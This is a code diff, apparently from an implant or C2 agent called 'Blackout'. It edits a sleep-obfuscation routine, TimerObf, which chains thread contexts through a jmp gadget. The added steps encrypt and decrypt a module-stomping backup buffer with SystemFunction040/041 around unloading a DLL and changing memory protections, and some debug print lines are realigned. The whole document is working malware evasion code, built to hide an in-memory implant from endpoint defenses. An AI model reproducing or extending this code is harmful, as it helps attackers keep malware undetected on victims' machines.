@@ -58,8 +58,8 @@ FUNC VOID TimerObf(
     }
 
     BK_PRINT( "\n" );
-    BK_PRINT( "[BK] Blackout base address    @ 0x%p [0x%x bytes]\n", Blackout().Region.Base, Blackout().Region.Length );
-    BK_PRINT( "[BK] Blackout Rx base address @ 0x%p [0x%x bytes]\n", Blackout().RxRegion.Base, Blackout().RxRegion.Length );
+    BK_PRINT( "[BK] Blackout base address    @ 0x%p [0x%x bytes]\n",   Blackout().Region.Base, Blackout().Region.Length );
+    BK_PRINT( "[BK] Blackout Rx base address @ 0x%p [0x%x bytes]\n",   Blackout().RxRegion.Base, Blackout().RxRegion.Length );
     BK_PRINT( "[BK] Blackout Rw base address @ 0x%p [0x%x bytes]\n\n", Blackout().RwRegion.Base, Blackout().RwRegion.Length );
 
     BK_PRINT( "[OBF] Rbx gadget @ 0x%p\n", Blackout().SleepObf.JmpGadget );
@@ -103,6 +103,12 @@ FUNC VOID TimerObf(
         ic++;
 
         Ctx[ic].Rip = Blackout().SleepObf.JmpGadget;
+        Ctx[ic].Rbx = &Instance()->Win32.SystemFunction040;
+        Ctx[ic].Rcx = Blackout().Stomp.Backup;
+        Ctx[ic].Rdx = Blackout().Region.Length;
+        ic++;
+
+        Ctx[ic].Rip = Blackout().SleepObf.JmpGadget;
         Ctx[ic].Rbx = &Instance()->Win32.LdrUnloadDll;
         Ctx[ic].Rcx = Blackout().Stomp.ModBase;
         ic++;
@@ -143,6 +149,12 @@ FUNC VOID TimerObf(
         Ctx[ic].Rdx = Blackout().Region.Length;
         Ctx[ic].R8  = PAGE_READWRITE;
         Ctx[ic].R9  = &OldProt;
+        ic++;
+
+        Ctx[ic].Rip = Blackout().SleepObf.JmpGadget;
+        Ctx[ic].Rbx = &Instance()->Win32.SystemFunction041;
+        Ctx[ic].Rcx = Blackout().Stomp.Backup;
+        Ctx[ic].Rdx = Blackout().Region.Length;
         ic++;
 
         Ctx[ic].Rip = Blackout().SleepObf.JmpGadget;
